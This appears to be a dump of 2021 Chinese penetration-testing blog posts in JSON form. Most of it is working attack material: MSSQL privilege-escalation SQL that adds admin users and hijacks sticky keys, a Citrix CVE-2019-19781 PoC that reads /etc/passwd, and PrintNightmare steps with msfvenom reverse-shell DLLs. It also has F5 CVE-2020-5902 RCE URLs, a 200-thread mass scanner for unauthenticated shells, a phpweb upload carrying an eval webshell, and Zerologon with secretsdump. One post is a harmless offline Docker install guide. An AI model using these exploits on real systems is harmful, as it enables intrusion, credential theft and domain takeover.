}\r$stringBuilder.AppendLine(\u0026quot;`n WITH PERMISSION_SET = UNSAFE;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec dbo.ExecCommand 'whoami /all';\u0026quot;) | Out-Null $stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.ToString() -join \u0026quot;\u0026quot; | Out-File C:\\Users\\Administrator\\Desktop\\dll\\exec.txt\r 输入以下命令，生成提权用到的命令，运行完成后在当前目录生成exec.txt文件（该脚本用于生成提权语句，将dll转成16进制，通过这种方式文件不落地。）\npwershell -exec bypass ./dll.ps1\r 打开可看到提权SQL语句，分别运行每一条SQL语句\n进入msdb数据库\nuse msdb;\r 0x03 将存储.Net程序集的数据库配置为可信赖的。 alter database master set trustworthy on;\r 0x04 启用MSSQL CLR功能 exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\r命令解释：\rexec sp_configure 'show advanced options',1; #显示高级选项：\rreconfigure; #重新配置\rexec sp_configure 'clr enabled',1; # 开启clr enabled 选项\rreconfigure; #重新配置\r--关闭所有服务器配置选项\rEXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE\r--如果存在权限问题，执行下面一段脚本\ralter database [master] set TRUSTWORTHY on\rEXEC sp_changedbowner 'sa'\r 0x05 利用SQL语句导入程序集 CREATE ASSEMBLY [Database1]\rAUTHORIZATION [dbo]\rFROM 0x0000\rWITH PERMISSION_SET = UNSAFE;\rGO\r 0x06 创建存储过程 CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\r 0x07 执行命令 执行系统命令，查看当前的权限\nexec dbo.ExecCommand 'whoami';\r 沙盒提权 什么是沙盒？\n沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。\n利用前提：\n 1.需要Microsoft.Jet.OLEDB.4.0一般在32位系统才可以，64位机需要12.0，较复杂\n2.dnary.mdb和ias.mdb两个文件 在win2003上默认存在，也可自行准备\n 提权操作\n简单总结\n--提权语句\rexec sp_configure 'show advanced options',1;reconfigure;\r-- 不开启的话在执行xp_regwrite会提示让我们开启，\rexec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;\r--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。\rexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;\r--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。\rexec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode'\r--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net user margin margin /add\u0026quot;)')\rselect * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\u0026quot;net localgroup administrators margin /add\u0026quot;)')\r沙盒模式SandBoxMode参数含义（默认是2）\r`0`：在任何所有者中禁止启用安全模式\r`1` ：为仅在允许范围内\r`2` ：必须在access模式下\r`3`：完全开启\ropenrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。\r--恢复配置\r--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1;\r--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;\r--exec sp_configure 'show advanced options',0;reconfigure;\r 引用前辈们的话\n 1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令\n 利用镜像劫持提权 0x01 简介 通过使用xp_regwrite存储过程对注册表进行修改，替换成任意值，造成镜像劫持。\n前提条件：\n 1.未禁止注册表编辑（即写入功能）\n2.xp_regwrite启用\n 0x02 映像劫持提权 1.查看xp_regwrite是否启用 select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'\r 返回1表示xp_regwrite组件启用 返回0则表示未启用\n2.xp_regwrite开启与关闭 EXEC sp_configure 'show advanced options', 1\rRECONFIGURE\rEXEC sp_configure 'xp_regwrite',1\rRECONFIGURE\r 3.利用regwrite函数修改组注册表进行劫持 首先我们利用regwrite函数修改组册表进行劫持，这里如果regwrite执行失败参考上面的开启方法。\nEXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\\windows\\system32\\cmd.exe'\r 4.查看是否劫持成功 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','Debugger'\r 5.验证是否成功 紧接着我们远程连接桌面，然后连续按5次shift就可以调用cmd窗口\n拓展：\n上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作\n6.删除指定注册表键值 删除粘滞键的键值\nxp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'\r 利用Agent Job执行命令 0x01 简介 SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务，这些任务在SQL Server 2019（15.x）中称为作业。\n原理：创建一个任务并执行命令，命令执行后的结果，将结果写入文件中。\nJob执行命令 1.启动sqlagent服务 首先需要启动sqlagent服务：\nexec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'\r 2.进入数据库 USE msdb;  3.定义创建作业 EXEC dbo.sp_add_job @job_name = N'test_powershell_job1';  4.定义作业步骤 定义作业步骤(作业中查看当前用户并将用户写入c:\\1.txt文件中)\nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\\windows\\system32\\cmd.exe /c whoami \u0026gt;c:\\\\1.txt', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';  5.启动作业 启动作业（启动作业需要一点时间，作业完成后会在c盘目录下新建），如果命令没有执行成功多运行几次即可。\nEXEC dbo.sp_start_job N'test_powershell_job1';\r 6.验证是否成功 参考地址：\nhttps://www.freebuf.com/vuls/276814.html\rhttps://y4er.com/post/mssql-getshell/\rhttps://f5.pm/go-26046.html\rhttp://alexsel.com/index.php/archives/80/\rhttps://xz.aliyun.com/t/9475\r ","id":50,"section":"posts","summary":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整","tags":["MSSQL","MSSQL提权"],"title":"MSSQL获取shell和提权","uri":"https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/","year":"2021"},{"content":"0x01 漏洞描述 Citrix旗下多款交付控制器和网关存在RCE漏洞，攻击者在无需身份验证的情况下就可执行任意命令。根据其他安全网站的说法，这个RCE漏洞会有一个标记漏洞（其中之一的标记），即本次报道的Citrx路径遍历漏洞（CVE-2019-19781）。Citrx路径遍历漏洞（CVE-2019-19781）利用方式的PoC已被公开。该漏洞利用复杂性低，且无权限要求，攻击者只能遍历vpns文件夹，但攻击者可能利用Citrx路径遍历漏洞进行RCE漏洞试探，从而发起进一步精准攻击。\n0x02 影响范围 Citrix NetScaler ADC and NetScaler Gateway version 10.5\rCitrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1 Citrix ADC and Citrix Gateway version 13.0\r 0x03 搜索语法 title=\u0026quot;Citrix\u0026quot;\r 0x04 漏洞复现 该洞目录遍历被限制子在vpns文件夹下，任意用户可通过HTTP请求直接访问该目录下的文件。\nhttps://xx.xx.xx.xx/vpn/../vpns/services.html\rhttps://xx.xx.xx.xx/vpn/../vpns/smb.conf\r如果没有修复的话的会返回 http 200\r 目前还是有很多没打补丁的 附上POC，建议修改文件名，文件名为：jas502n\nPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\rHost: 192.168.3.244\rUser-Agent: 1\rConnection: close\rNSC_USER: ../../../netscaler/portal/templates/jas502n\rNSC_NONCE: nsroot\rContent-Length: 97\rurl=http://example.com\u0026amp;title=jas502n\u0026amp;desc=[% template.new('BLOCK' = 'print `cat /etc/passwd`') %]\r 请求上传的内容\nGET /vpn/../vpns/portal/jas502n.xml HTTP/1.1\rHost: 192.168.3.244\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding: gzip, deflate\rConnection: close\rNSC_USER: nsroot\rNSC_NONCE: nsroot\rUpgrade-Insecure-Requests: 1\rCache-Control: max-age=0\r 以上代码来自jas502n，GitHub地址：https://github.com/jas502n/CVE-2019-19781\n","id":51,"section":"posts","summary":"0x01 漏洞描述 Citrix旗下多款交付控制器和网关存在RCE漏洞，攻击者在无需身份验证的情况下就可执行任意命令。根据其他安全网站的说法，这个RC","tags":["漏洞复现"],"title":"Citrix路径遍历（CVE-2019-19781）","uri":"https://ad-calcium.github.io/2021/07/citrix%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86cve-2019-19781/","year":"2021"},{"content":"复现环境 靶机：Windows Server 2019\n攻击机：kali\n漏洞介绍 Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击者可以通过该漏洞绕过PfcAddPrinterDriver的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。\n该漏洞广泛的存在于各Windows版本中，利用复杂度为中，但由于成功利用该漏洞的攻击者可以完整的控制域环境，造成非常严重的后果，所以该漏洞的利用价值极高。\n影响版本 Windows Server 2016\nWindows Server 2019\n利用前提 1.靶机没有更新CVE-2021-1675的补丁\n2.域内任意账户的用户名密码\n3.域控ip\n4.可被域控匿名访问的共享文件夹\n漏洞工具 CVE-2021-1675(域提权)：https://github.com/cube0x0/CVE-2021-1675\nCVE-2021-1675本地提权：https://github.com/gyaansastra/Print-Nightmare-LPE\n漏洞复现 一、域提权 1.配置smb服务 下面为配置文件/etc/samba/smb.conf需要修改的地方。\n[global]\rmap to guest = Bad User\rserver role = standalone server\rusershare allow guests = yes\ridmap config * : backend = tdb\rsmb ports = 445\rlog level = 10\r[share]\rcomment = share\rpath = /tmp\rguest ok = yes\rwritable =yes\rbrowsable = yes\r#force user = smbuser\r 启动smb服务\nservice smbd start\r 2.探测是否存在漏洞 使用impacket工具包中的rpcdump.py判断目标及其是否存在漏洞\nrpcdump.py @10.99.99.250 | grep MS-RPRN\r 3.使用msf生成恶意dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.99.99.175 LPORT=9999 -f dll -o /tmp/test.dll\r注意：只能使用64位的dll文件，否则会发现，dll可以上传但不会被执行\r 4.开启msf监听 使用msf监听，首先输入msfconsole\n输入以下内容监听\nuse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 10.99.99.175\rset lport 9999\rrun\r 5.漏洞利用 进入exp目录\ncd /root/CVE-2021-1675-main\r 漏洞利用\n其中cyberpeace为域的名字，admin:qq123456..分别是域控任意用户的账号密码，10.99.99.250是域控ip。 后面的\\\\10.99.99.175\\share\\test.dll为smb可访问的unc路径，也是共享文件的路径。\npython3 CVE-2021-1675.py cyberpeace/admin:qq123456..@10.99.99.250 \u0026quot;\\\\\\10.99.99.175\\share\\test.dll\u0026quot;\r 成功获取域控权限\n查看当前主机权限和主机信息\ngetuid #查看当前权限\rsysinfo #查看主机信息\r 二、本地提权 1.新增用户 默认添加一个新用户到本地管理员组：\npowershell\rImport-Module .\\cve-2021-1675.ps1 #导入模块\rInvoke-Nightmare -newuser \u0026quot;test\u0026quot; -newpassword \u0026quot;test\u0026quot; -drivername \u0026quot;printme\u0026quot; #新建用户，用户名：test 密码：test\r 验证攻击是否成功\n2.自定义dll文件 msf生成dll文件\nmsfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.3.54 lport=4444 -f dll \u0026gt; x.dll\r 监听主机\nuse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset LHOST 192.168.93.40\rset lport 4444\rexploit\r 加载dll文件\nImport-Module .\\cve-2021-1675.ps1\rInvoke-Nightmare -DLL \u0026quot;C:\\Users\\Administrator\\Downloads\\x.dll\u0026quot;\r 主机成功上线\n","id":52,"section":"posts","summary":"复现环境 靶机：Windows Server 2019 攻击机：kali 漏洞介绍 Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击","tags":["域渗透","内网渗透"],"title":"CVE-2021-1675 漏洞复现","uri":"https://ad-calcium.github.io/2021/07/%E5%9F%9F%E6%B8%97%E9%80%8F-cve-2021-1675%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞简述 F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。\n在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置程序的特定页面中存在一处远程代码执行漏洞。\n未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。\n0x03 影响版本 BIG-IP 15.x: 15.1.0/15.0.0\rBIG-IP 14.x: 14.1.0 ~ 14.1.2\rBIG-IP 13.x: 13.1.0 ~ 13.1.3\rBIG-IP 12.x: 12.1.0 ~ 12.1.5\rBIG-IP 11.x: 11.6.1 ~ 11.6.5\r 0x03 搜索语法 fofa：title=\u0026quot;BIG-IP\u0026amp;reg;- Redirect\u0026quot;\r 0x04 漏洞验证 POC https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\rhttps:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts\rhttps:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license\rhttps:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf\rhttps:///tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin\r RCE 1、修改alias ，将list设置成bash命令\rhtts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash\r2、生成bash文件并写入要执行的命令\rhtts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe\u0026amp;content=whoami\r3、执行bash文件\rhtts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe\r4、还原alias设置，防止影响目标正常使用\rhttps://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list\r RCE验证截图 0x05 漏洞修复 升级到以下版本：\nBIG-IP 15.x: 15.1.0.4 BIG-IP 14.x: 14.1.2.6 BIG-IP 13.x: 13.1.3.4 BIG-IP 12.x: 12.1.5.2 BIG-IP 11.x: 11.6.5.2\n0x06 参考地址： https://mp.weixin.qq.com/s/twTCflFpxmOhA0gmAuwImA4\rhttps://github.com/sv3nbeast/CVE-2020-5902_RCE\r ","id":53,"section":"posts","summary":"0x01 漏洞简述 F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。 在 F5 BIG-IP 产品的流","tags":["漏洞复现"],"title":"F5 BIG-IP TMUI(CVE-2020-5902)远程代码执行漏洞","uri":"https://ad-calcium.github.io/2021/07/f5-big-ip-tmuicve-2020-5902%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 漏洞检测 漏洞payload: http://IP/shell\n0x02 漏洞验证 在server.js代码中, 使用了在线的shell控制台, 该控制台未进行鉴权, 导致存在未授权访问\n通过该漏洞获取容器中的root权限, 可通过容器逃逸获取宿主机权限\n读取的京东cookie\n以下为批量脚本, 代码比较粗糙,大佬勿喷\n# -*- coding: utf-8 -*-\r# @Time : 2021/6/30 9:07\r# @Author : AD钙奶\rimport json\rimport re\rimport time\rimport requests\rimport ssl\rimport threadpool\rfrom loguru import logger\rtry:\rrequests.packages.urllib3.disable_warnings()\r_create_unverified_https_context = ssl._create_unverified_context\rexcept AttributeError:\rpass\relse:\rssl._create_default_https_context = _create_unverified_https_context\rdef brute_force(_url):\rurls = _url + '/shell'\rheaders = {\r\u0026quot;Accept\u0026quot;: \u0026quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026quot;,\r\u0026quot;Accept-Encoding\u0026quot;: \u0026quot;gzip, deflate\u0026quot;,\r\u0026quot;Accept-Language\u0026quot;: \u0026quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026quot;,\r\u0026quot;Cache-Control\u0026quot;: \u0026quot;max-age=0\u0026quot;,\r\u0026quot;Connection\u0026quot;: \u0026quot;keep-alive\u0026quot;,\r\u0026quot;Cookie\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;Upgrade-Insecure-Requests\u0026quot;: \u0026quot;1\u0026quot;,\r\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59\u0026quot;,\r}\rtry:\rresp = requests.get(url=urls, headers=headers, timeout=20)\rif resp.status_code == 200 and resp.headers['Set-Cookie']:\rinfo1 = f\u0026quot;系统存在未授权漏洞，存在漏洞的网站: {str(urls)}\u0026quot;\rfilename1 = time.strftime(\u0026quot;%Y-%m-%d-\u0026quot;) + 'vuln_存在未授权.txt'\rsave_vuln(filename1, info1)\rlogger.info(info1)\rexcept Exception as e:\rpass\rdef save_vuln(filename, info1):\rfile_path = './result/' + filename\rwith open(file_path, \u0026quot;a\u0026quot;) as f:\rinfo1 = info1 + '\\n'\rf.write(info1)\rdef open_file():\rwith open(\u0026quot;url3.txt\u0026quot;, 'r', encoding='UTF-8') as f:\rurls = f.readlines()\rurls = [url.strip() for url in urls if url and url.strip()]\rreturn urls\rdef main():\rurl = open_file()\rpool = threadpool.ThreadPool(200)\rthread = threadpool.makeRequests(brute_force, url)\r[pool.putRequest(req) for req in thread]\rpool.wait()\rif __name__ == '__main__':\rmain()\r ","id":54,"section":"posts","summary":"0x01 漏洞检测 漏洞payload: http://IP/shell 0x02 漏洞验证 在server.js代码中, 使用了在线的shell控制台, 该控制台未进行鉴权, 导致存在未授权访问 通","tags":["漏洞复现","web安全"],"title":"JD羊毛脚本漏洞","uri":"https://ad-calcium.github.io/2021/07/jd%E7%BE%8A%E6%AF%9B%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 影响范围 版本 2.0.35\r 0x02 测试环境： windows 2008 + PHPnow1.6.5 + phpwebV2.0.35\r 秘钥加密方式\n$k=md5(strrev($dbUser.$dbPass));\r$h=$_SERVER[\u0026quot;HTTP_REFERER\u0026quot;];\r$t=$_POST[\u0026quot;t\u0026quot;];\r$m=$_POST[\u0026quot;m\u0026quot;];\r$act=$_POST[\u0026quot;act\u0026quot;];\r$path=$_POST[\u0026quot;path\u0026quot;];\r$md5=md5($k.$t);\rif($m!=$md5){\recho \u0026quot;ERROR: 安全性校验错误\u0026quot;;\r}\r 0x03 漏洞检测方法 1、获取秘钥 POST /3151/base/post.php HTTP/1.1\rHost: 192.168.59.138\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding: gzip, deflate\rDNT: 1\rConnection: close\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 11\ract=appcode\r 获取的秘钥：k=01a5b56136714988a0aa6d13cb73f82a\u0026amp;t=1579150020\n将k的值拼接字符\u0026rsquo;a'：a6bd1d895fc946ed8d6a2446890cb7ce\n2、使用md5加密 3、上传webshell 通过 appfile.php 上传的shell路径是/effect/source/bg/文件名.php 通过 appplus.php上传的shell路径是/update/ /文件名.php\nPOST /3151//base/appfile.php HTTP/1.1\rHost: 192.168.59.138\rCache-Control: max-age=0\rOrigin: null\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\rContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryCznr39h1oUlUvOGG\rAccept: */*\rReferer: http://192.168.59.138/3151//base/appfile.php\rAccept-Language: zh-cn\rCookie: Hm_lvt_a93ba41c8cfa578d8fa3f514694f399b=1570960058;\rHost: 192.168.59.138\rContent-Length: 726\r------WebKitFormBoundaryCznr39h1oUlUvOGG\rContent-Disposition: form-dAta;name='file';fIlename='configs.php'\rContent-Type: application/octet-stream\r\u0026lt;?php @eval($_POST[pass]);?\u0026gt;\r------WebKitFormBoundaryCznr39h1oUlUvOGG\rContent-Disposition: form-data; name='t'\ra\r------WebKitFormBoundaryCznr39h1oUlUvOGG\rContent-Disposition: form-data; name='m'\ra6bd1d895fc946ed8d6a2446890cb7ce\r------WebKitFormBoundaryCznr39h1oUlUvOGG\rContent-Disposition: form-data; name='act'\rupload\r------WebKitFormBoundaryCznr39h1oUlUvOGG\rContent-Disposition: form-data; name='r_size'\r28\r------WebKitFormBoundaryCznr39h1oUlUvOGG\rContent-Disposition: form-data; name='submit'\rgetshell\r------WebKitFormBoundaryCznr39h1oUlUvOGG--\r 4、成功获取webshell ","id":55,"section":"posts","summary":"0x01 影响范围 版本 2.0.35 0x02 测试环境： windows 2008 + PHPnow1.6.5 + phpwebV2.0.35 秘钥加密方式 $k=md5(strrev($dbUser.$dbPass)); $h=$_SERVER[\u0026quot;HTTP_REFERER\u0026quot;]; $t=$_POST[\u0026quot;t\u0026quot;]; $m=$_POST[\u0026quot;m\u0026quot;]; $act=$_POST[\u0026quot;act\u0026quot;]; $path=$_POST[\u0026quot;path\u0026quot;]; $md5=md5($k.$t); if($m!=$md5){ echo \u0026quot;ERROR: 安全性校验错误\u0026quot;; } 0x03 漏洞检测方法 1、获取秘钥 POST /3151/base/post.php HTTP/1.1 Host: 192.168.59.138 User-Agent:","tags":["漏洞复现"],"title":"phpweb前台getshell","uri":"https://ad-calcium.github.io/2021/07/phpweb%E5%89%8D%E5%8F%B0getshell/","year":"2021"},{"content":"1.下载docker-19.03.8.tgz\nwget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz\r 2.解压 docker-19.03.8.tgz\ntar -xvf docker-19.03.8.tgz\r 复制  sudo cp docker/* /usr/bin/\r 4.复制一下内容到 vim /etc/systemd/system/docker.service\n\r[Unit]\rDescription=Docker Application Container Engine\rDocumentation=https://docs.docker.com\rAfter=network-online.target firewalld.service\rWants=network-online.target\r[Service]\rType=notify\r# the default is not to use systemd for cgroups because the delegate issues still\r# exists and systemd currently does not support the cgroup feature set required\r# for containers run by docker\rExecStart=/usr/bin/dockerd\rExecReload=/bin/kill -s HUP $MAINPID\r# Having non-zero Limit*s causes performance problems due to accounting overhead\r# in the kernel. We recommend using cgroups to do container-local accounting.\rLimitNOFILE=infinity\rLimitNPROC=infinity\rLimitCORE=infinity\r# Uncomment TasksMax if your systemd version supports it.\r# Only systemd 226 and above support this version.\r#TasksMax=infinity\rTimeoutStartSec=0\r# set delegate yes so that systemd does not reset the cgroups of docker containers\rDelegate=yes\r# kill only the docker process, not all processes in the cgroup\rKillMode=process\r# restart the docker process if it exits prematurely\rRestart=on-failure\rStartLimitBurst=3\rStartLimitInterval=60s\r[Install]\rWantedBy=multi-user.target\r 5.加载文件 使其生效\nsystemctl daemon-reload  6.重启动docker\nsystemctl restart docker  7.开机自启docker命令\nsystemctl enable docker\r 8.重启系统检查服务是否正在运行\nps -aux | grep docker\r 9.检查服务是否开机启动\nsystemctl is-enabled docker.service  如果docker开机未自启，按照以下命令重新设置开启自启\n1.将服务配置成开机启动\nsystemctl enable docker.service  2.启动服务\nsystemctl start docker.service  Docker更换国内镜像源\n修改/etc/docker/daemon.json配置文件\ncat \u0026lt;\u0026lt; 'EOF' \u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://registry.docker-cn.com\u0026quot;,\u0026quot;http://hub-mirror.c.163.com\u0026quot; ],\r\u0026quot;exec-opts\u0026quot;: [\u0026quot;native.cgroupdriver=systemd\u0026quot;],\r\u0026quot;log-driver\u0026quot;: \u0026quot;json-file\u0026quot;,\r\u0026quot;log-opts\u0026quot;: {\r\u0026quot;max-size\u0026quot;: \u0026quot;50m\u0026quot;\r},\r\u0026quot;storage-driver\u0026quot;: \u0026quot;overlay2\u0026quot;,\r\u0026quot;storage-opts\u0026quot;: [\r\u0026quot;overlay2.override_kernel_check=true\u0026quot;\r]\r}\rEOF\r 容器开机启动： 创建容器时候指定restart参数：\ndocker run -it -p 6379:6379 --restart=always --name redis -d redis\r docker自启\ndocker run -d --name phpmyadmin -p 80:80 --restart=always 44924:latest\r 对已经创建的容器用docker update 更新:\ndocker update --restart=always xxx\r--restart具体参数值详细信息 :\rno - 容器退出时，不重启容器\ron-failure - 只有在非0状态退出时才从新启动容器\ralways - 无论退出状态是如何，都重启容器\r 安装docker-compose （1）首先访问 docker-compose 的 GitHub 版本发布页面：\n https://github.com/docker/compose/releases  （2）由于服务器是 CentOS 系统，则下载 Linux 版本的 Compose：\n（3）将下载下来的“docker-compose-Linux-x86_64”文件上传到服务器上，然后执行如下命令将其移动到 /usr/local/bin，并改名为“docker-compose”。\nmv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose\r （4）接着执行如下命令添加可执行权限：\nchmod +x /usr/local/bin/docker-compose\r （5）最后使用 docker-compose -v 命令测试是否安装成功（如果提示“没有那个文件或目录”可以重启下服务器再试试）：\nkail安装好docker之后 构建容器可能会报错，使用以下命令解决该问题\nsudo mkdir /sys/fs/cgroup/systemd\rsudo mount -t cgroup -o none,name=systemd cgroup /sys/fs/cgroup/systemd\r ","id":56,"section":"posts","summary":"1.下载docker-19.03.8.tgz wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz 2.解压 docker-19.03.8.tgz tar -xvf docker-19.03.8.tgz 复制 sudo cp docker/* /usr/bin/ 4.复制一下内容到 vim /etc/systemd/system/docker.service [Unit] Description=Docker Application Container Engine Documentation=https://docs.docker.com After=network-online.target firewalld.service Wants=network-online.target [Service] Type=notify # the default is not to use systemd for cgroups","tags":["软件安装"],"title":"离线安装docker","uri":"https://ad-calcium.github.io/2021/07/%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85docker/","year":"2021"},{"content":"漏洞介绍 2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分\r攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序\r 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1\rWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\rWindows Server 2012\rWindows Server 2012 (Server Core installation)\rWindows Server 2012 R2\rWindows Server 2012 R2 (Server Core installation)\rWindows Server 2016\rWindows Server 2016 (Server Core installation)\rWindows Server 2019\rWindows Server 2019 (Server Core installation)\rWindows Server, version 1903 (Server Core installation)\rWindows Server, version 1909 (Server Core installation)\rWindows Server, version 2004 (Server Core installation)\r 复现环境 版本: Windows Server 2012\rIP: 10.99.99.253\rBlosname: OWA2013 (域控的主机名)\r 漏洞工具 impacket https://github.com/SecureAuthCorp/impacket\r重置域内管理员密码poc https://github.com/dirkjanm/CVE-2020-1472\r恢复密码poc https://github.com/risksense/zerologon\r 漏洞复现 福漏洞开始使用exp重置管理员密钥\npython3 cve-2020-1472-exploit.py OWA2013 10.99.99.253\r 通过 Dcsync获取域内所有有用户hash\npython3 secretsdump.py rootkit/OWA2013\\$@10.99.99.253 -just-dc -no-pass\r 得到了域控的 